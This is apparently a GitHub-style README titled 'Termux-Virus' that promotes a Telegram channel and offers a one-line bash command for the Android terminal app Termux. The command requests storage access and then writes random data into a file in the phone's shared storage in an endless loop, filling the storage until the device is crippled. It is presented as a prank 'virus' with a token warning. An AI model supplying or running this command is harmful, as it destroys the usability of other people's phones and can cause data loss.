# Termux-Virus

⚠ **Warning**: Run at your own risk.

Join My Channel: [SG_Modder1](https://t.me/SG_Modder1)

😈 **2024 New Termux Virus By Me** 😈

```bash
termux-setup-storage && if [ -d "/storage/emulated/0" ]; then while true; do dd if=/dev/urandom of="/storage/emulated/0/device.bin" bs=1M conv=notrunc oflag=append > /dev/null 2>&1 && echo "🟩"; done; else echo "Give storage permissions."; termux-setup-storage; fi
